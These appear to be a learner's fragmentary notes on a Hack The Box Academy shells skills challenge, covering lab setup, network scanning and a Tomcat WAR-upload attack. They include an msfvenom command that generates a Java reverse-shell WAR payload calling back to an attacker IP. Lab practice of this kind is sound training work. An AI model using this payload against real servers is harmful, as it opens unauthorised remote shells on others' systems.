

Enter your credentials again and click `OK` and you will be connected to the provided Parrot Linux desktop instance.

#### Target Hosts

![image](https://academy.hackthebox.com/storage/modules/115/challenge-map.png)

Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (`172.16.0.0/23` network) so you may want to pay careful attention to the IP address you pick when starting your listeners.


Steps.

Maybe scan the `172.16.0.0/23` 

How can i find the IP address of blog.inlanefreight.local . We will see



https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/


`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`


I used this + the article for the first one





Node 2:


172.16.1.12


